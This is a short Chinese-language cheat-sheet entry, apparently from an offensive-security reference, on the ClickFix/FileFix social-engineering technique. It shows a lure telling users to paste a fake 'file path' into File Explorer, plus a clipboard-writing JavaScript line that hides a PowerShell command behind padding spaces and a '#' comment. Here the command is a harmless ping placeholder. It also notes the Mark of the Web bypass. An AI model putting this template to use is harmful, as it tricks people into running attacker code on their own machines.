# ClickFix

> ClickFix 是一种社会工程学攻击，它诱导用户在不知情的情况下执行恶意代码，通常是通过“运行”对话框 (`Windows 键 + R`) 进行的。

## FileFix

向用户显示一条消息，诱导其在 shell 或等效程序（如文件资源管理器）中复制并粘贴命令。

```ps1
要访问该文件，请遵循以下步骤：
1. 复制下方文件路径：
   `C:\company\internal-secure\filedrive\HRPolicy.docx`
2. 打开文件资源管理器并选择地址栏 (CTRL + L)
3. 粘贴文件路径并按回车键 (Enter)
```

用户点击“复制 (COPY)”按钮后，其剪贴板内容应被设置为以下内容：

```ps1
navigator.clipboard.writeText("powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
```

这里添加了一些技巧来提高 payload 的效率：

* 使用多个空格来隐藏 payload 的起始部分
* 使用包含文件虚拟路径的 `#` 注释

通过文件资源管理器的地址栏执行的可执行文件（如 .exe）会移除其中的 Mark of The Web (MOTW) 属性。

## 参考资料 (References)

* [FileFix - A ClickFix Alternative - mrd0x - June 23, 2025](https://mrd0x.com/filefix-clickfix-alternative/)
* [FileFix (Part 2) - mrd0x - June 30, 2025](https://mrd0x.com/filefix-part-2/)
